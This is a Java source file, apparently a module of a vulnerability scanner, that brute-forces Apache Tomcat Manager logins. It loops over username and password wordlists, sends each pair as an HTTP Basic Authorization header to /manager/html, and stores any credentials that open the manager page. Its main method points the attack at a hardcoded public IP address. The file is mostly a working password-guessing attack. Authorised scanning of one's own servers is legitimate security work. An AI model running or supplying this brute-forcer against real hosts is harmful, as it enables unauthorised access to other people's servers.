package cn.com.sgcc.marki_with_maven.modules;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.codec.binary.Base64;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.util.EntityUtils;

import cn.com.sgcc.marki_with_maven.misc.NetWorkTools;

public class TomcatWeakPassword implements IPocBase {



	@Override
	public boolean match(Map infodict) {
		// TODO Auto-generated method stub
		boolean ismatch = false;
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		if (Integer.valueOf(port) == 8080 || serviceVersion.toLowerCase().contains("tomcat"))
		{
			ismatch = true;
		}
		return ismatch;
	}

	@Override
	public boolean verify(Map infodict) {
		// TODO Auto-generated method stub
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		boolean success = false;
		CloseableHttpClient customClient = null;
		try {
			String url = String.format("%s://%s:%s/manager/html", serviceType.contains("https") ? "https":"http", ip, port );
			HttpGet httpGet = new HttpGet(url);
			customClient = new NetWorkTools().getCustomClient();
			CloseableHttpResponse resp = customClient.execute(httpGet);
			if ( resp.getStatusLine().getStatusCode() == 404 )
			{
				success = false;
				return success;
			}
			httpGet.releaseConnection();
			BufferedReader brUserName = new BufferedReader(new InputStreamReader(new FileInputStream(new File("data/tomcat_user.txt"))));
			BufferedReader brPassWord = new BufferedReader(new InputStreamReader(new FileInputStream(new File("data/tomcat_pass.txt"))));
			ArrayList<String> userNames = new ArrayList<String>();
			ArrayList<String> passWords = new ArrayList<String>();
			String tmpuserName = "";
			String tmppassWord = "";
			while( (tmpuserName = brUserName.readLine() ) != null)
			{
				userNames.add(tmpuserName);
			}
			while(  (tmppassWord = brPassWord.readLine()) != null )
			{
				passWords.add(tmppassWord);
			}
			
			boolean isBreak = false;
			for(String userName : userNames)
			{
				if (isBreak )
					break;
				for (String passWord : passWords)
				{
//					CloseableHttpClient customClientLocal = getCustomClient();
					HttpGet httpGetLocal = new HttpGet(url);
					httpGetLocal.setHeader("Authorization", String.format("Basic %s",  new Base64().encodeBase64String(String.format("%s:%s", userName, passWord).getBytes()) ));
					CloseableHttpResponse respLocal = customClient.execute(httpGetLocal);
					String content = EntityUtils.toString(respLocal.getEntity());
					httpGetLocal.releaseConnection();
					if(content.toLowerCase().contains("Application Manager".toLowerCase()) && content.toLowerCase().contains("Welcome".toLowerCase()) && respLocal.getStatusLine().getStatusCode() == 200)
					{
						infodict.put("extra", String.format("%s:%s", userName, passWord));
						success = true;
						isBreak = true;
						break;
					}
				}
			}
			
			
		} catch (KeyManagementException | NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		finally
		{
			try {
				if(customClient != null)
					customClient.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return success;
	}

	@Override
	public Map info() {
		// TODO Auto-generated method stub
		Map info = new HashMap<String, Object>();
		info.put("name", "tomcat_weak_password");
		return info;
	}
	
	
	public static void main(String[] args)
	{
		Map infodict = new HashMap<String, String>();
		infodict.put("ip", "2.228.67.159");
		infodict.put("port", "9999");
		infodict.put("service_type", "http");
		infodict.put("service_version", "tomcat");
		new TomcatWeakPassword().verify(infodict);
	}
}
